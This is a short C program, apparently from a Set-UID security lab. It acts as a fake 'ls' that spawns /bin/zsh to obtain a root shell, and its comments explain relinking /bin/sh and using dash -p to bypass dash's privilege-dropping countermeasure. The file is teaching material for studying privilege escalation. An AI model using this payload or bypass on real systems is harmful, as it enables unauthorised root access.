#include <stdio.h>
#include <stdlib.h>

/* A countermeasure implemented in dash of Ubuntu 16.04:
 Prevent itself from being executed in Set-UID programs.
 system(cmd)  call /bin/sh to execute cmd,
 /bin/sh -> /bin/dash, /bin/sh links to /bin/dash by default
 */

int main(){
	printf("My malicious ls program is called!\n");

	/*Change link first: /bin/sh -> /bin/zsh 
	Using: sudo ln -sf /bin/zsh /bin/sh
	*/
	system("/bin/zsh"); // Get root privilege
	// system("/bin/sh") // Get root privilege
	// system("/bin/dash") // No root privilege
	// system("/bin/bash") // No root privilege
	// system("/bin/dash -p"); // Get root privilege

	/*Recover link first: /bin/sh -> /bin/dash 
	Using: sudo ln -sf /bin/dash /bin/sh
	*/
	// system("/bin/zsh"); // No root privilege
	// system("/bin/sh") // No root privilege
	// system("/bin/dash") // No root privilege
	// system("/bin/bash") // No root privilege
	// system("/bin/dash -p"); // No root privilege

	return 0;
}